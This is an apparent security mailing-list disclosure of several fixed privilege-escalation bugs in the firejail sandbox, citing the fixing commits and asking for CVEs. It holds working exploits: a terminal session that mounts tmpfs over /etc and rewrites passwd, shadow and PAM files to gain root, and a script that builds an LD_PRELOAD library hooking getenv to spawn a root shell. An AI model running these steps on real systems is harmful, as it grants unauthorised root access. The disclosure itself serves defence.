I agree. I've kicked the tires a couple of times over the last year and
my feeling is that there remains a lot of low hanging exploitable fruit.
Although the devs have, with some encouragement, introduced macros to
permanently drop privs or drop euid 0 where possible there are still
places where that is not the case.

Setuid-root makes me sad, copy_file() worries me still and the ability
for a non-priv user to run any seccomp filter on anything feels like an
accident waiting to happen (assuming it cannot already be exploited).

A handful of concrete examples that I have reported are below. These are
fixed but not previously discussed here and do not have CVEs AFAIK
(perhaps MITRE could do the honors where deemed appropriate?).

1. --tmpfs

Prior to these commits:

  commit cea58747d61dc56ff8bb57aa02786cd8cc423bca
  Author: netblue30 <netblue30@...oo.com>
  Date:   Mon Jan 25 15:01:57 2016 -0500

      --tmpfs allowd only as root user

  commit 678cd1495457318dad39178bb646ba1b96332ddb
  Author: root <root@...ian>
  Date:   Mon Jan 25 14:58:27 2016 -0500

      --tmpfs allowd only as root user

any non-privileged user could mount a tmpfs over any location. Eg mount
over /etc to get root shell:

martin@...ntu14:~$ firejail --noprofile --tmpfs=/etc
Parent pid 27720, child pid 27721
Warning: failed to mount /sys
Child process initialized
[I have no name!@...ntu14 firejail]$ echo
"root:x:0:0:root:/root:/bin/bash" > /etc/passwd
[I have no name!@...ntu14 firejail]$ uid=$(id -u)
[I have no name!@...ntu14 firejail]$ echo "martin:x:$uid:
$uid::/tmp:/bin/bash" >> /etc/passwd
[I have no name!@...ntu14 firejail]$ echo "root::::::::" > /etc/shadow
[I have no name!@...ntu14 firejail]$ echo "martin::::::::"
>> /etc/shadow
[I have no name!@...ntu14 firejail]$ echo "root:x:0:" > /etc/group
[I have no name!@...ntu14 firejail]$ echo "martin:x:$uid:" >> /etc/group
[I have no name!@...ntu14 firejail]$ touch /etc/{login.defs,pam.conf}
[I have no name!@...ntu14 firejail]$ mkdir /etc/pam.d
[I have no name!@...ntu14 firejail]$ echo "account sufficient
pam_permit.so" > /etc/pam.d/other
[I have no name!@...ntu14 firejail]$ echo "auth sufficient
pam_permit.so" >> /etc/pam.d/other
[I have no name!@...ntu14 firejail]$ echo "session sufficient
pam_permit.so" >> /etc/pam.d/other
[I have no name!@...ntu14 firejail]$ su -
root@...ntu14:~# id
uid=0(root) gid=0(root) groups=0(root)

2. Nuke /etc/resolv.conf

This is silly (but was flagged in the change log as a security issue):
by chrooting to / a non-privileged user can truncate the
(real) /etc/resolv.conf to 0 bytes. Fixed at:

  commit 6144229605177764b7f3f3450c1a47f56595dc9e
  Author: netblue30 <netblue30@...oo.com>
  Date:   Thu Oct 27 10:16:07 2016 -0400

      security: overwrite /etc/resolv.conf

3. Non-sticky /tmp, /var/tmp

"Mode 0777 considered harmful". For example (priv esc via system util,
perhaps using "--caps.keep=setuid" left as exercise for reader):

martin@...ntu14:~$ firejail --noprofile
Parent pid 11658, child pid 11659
Warning: failed to mount /sys
Child process initialized
[martin@...ntu14 firejail]$ ls -ld /var/tmp
drwxrwxrwx. 2 root root 40 Jan 26 23:59 /var/tmp
[martin@...ntu14 firejail]$ exit
martin@...ntu14:~$ ls -ld /var/tmp
drwxrwxrwt. 4 root root 4096 Jan 26 19:23 /var/tmp
martin@...ntu14:~$

/tmp was mounted tmpfs 0777 prior to:

  commit aa28ac9e09557b833f194f594e2940919d940d1f
  Author: netblue30 <netblue30@...oo.com>
  Date:   Sun Jan 31 15:15:24 2016 -0500

      various fixes

/dev, /dev/shm, /var/tmp, /var/lock were mounted 0777 prior to:

  commit cd0ecfc7a7b30abde20db6dea505cd8c58e7c046
  Author: netblue30 <netblue30@...oo.com>
  Date:   Fri Jan 29 09:20:19 2016 -0500

      0.9.38-rc1 testing

There are other weak perms fixed around here eg /dev/shm/firejail was
0777 prior to:

  commit 1cab02f5ae3c90c01fae4d1c16381820b757a3a6
  Author: netblue30 <netblue30@...oo.com>
  Date:   Sun Jan 31 11:37:23 2016 -0500

      various fixes

(I have not looked at these related changes and the exploitability of
the issues that they hope to remediate).

4. Environment not cleaned before root exec()

The --x11 flag runs an X server as root in some circumstances and the
--env flag can be used to set arbitrary environment variables. This
skips runtime linker protections on eg LD_* variables for setuid
executables. So a non-privileged user could pop a root shell in any
number of ways, eg hooking calls to getenv(3) in xauth(1):

  #!/bin/sh
  gcc -xc -o rootshell.so -shared -fPIC - <<EOF
  #include <stdlib.h>
  char *getenv(const char *name) { exit(system("/bin/sh")); }
  EOF
  exec firejail --x11=xorg --env=LD_PRELOAD=$PWD/rootshell.so

There were a couple of fixes:

  commit 3b81e1f2c331644ced87d26a943b22eed6242b8f
  Author: netblue30 <netblue30@...oo.com>
  Date:   Thu Nov 3 10:53:51 2016 -0400

      security: env variables

  commit 72bc0e145c67da24e555d868086953148c52b5fc
  Author: netblue30 <netblue30@...oo.com>
  Date:   Fri Nov 4 09:12:52 2016 -0400

      execv fixes

(the overly-specific LD_PRELOAD asserts that you see in there is a
(hopefully redundant!) relic of that conversation).

5. Finally, I don't think this was one of mine but I spotted it paging
through the commit log this evening:

  commit a23ac1bf390fa4c3db4ea31e6ee6100a9c511d59
  Author: netblue30 <netblue30@...oo.com>
  Date:   Tue Jan 26 09:19:19 2016 -0500

      don't allow --chroot as user without seccomp support

Currently a non-privileged user can chroot anywhere but is prevented
from mischief by seccomp filtering. (Thought this  worries me too,
perhaps someone else can punt it further?). Prior to commit a23ac above
however systems without seccomp support were permitted to use the
--chroot flag but could not offer this seccomp mitigation. I'm guessing
this leads to a privesc via the "copy binary" function on sudo(1) or
similar (setuid) into a suitably prepared chroot.

firejail needs more attention IMHO, I'm sure there are more to shake
out.

Regards,

Martin.
